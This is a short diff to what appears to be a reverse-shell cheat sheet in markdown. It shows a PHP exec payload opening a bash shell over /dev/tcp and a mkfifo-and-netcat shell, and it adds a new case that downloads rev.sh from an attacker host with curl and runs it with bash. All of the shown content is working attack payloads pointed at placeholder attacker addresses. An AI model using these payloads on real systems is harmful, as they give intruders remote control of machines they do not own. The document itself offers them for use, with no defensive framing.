@@ -176,10 +176,19 @@ php(file)
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1'");?>
 ```
 
-for some special cases 
+for some special cases#1 
 
 ```shell
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker ip> <attacker port> >/tmp/f
+```
+
+special cases 2
+
+```shell
+# rev.sh
+# sh -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1
+curl http://<attacker ip>/rev.sh -o /tmp/rev.sh
+bash /tmp/rev.sh
 ```
 
 base64
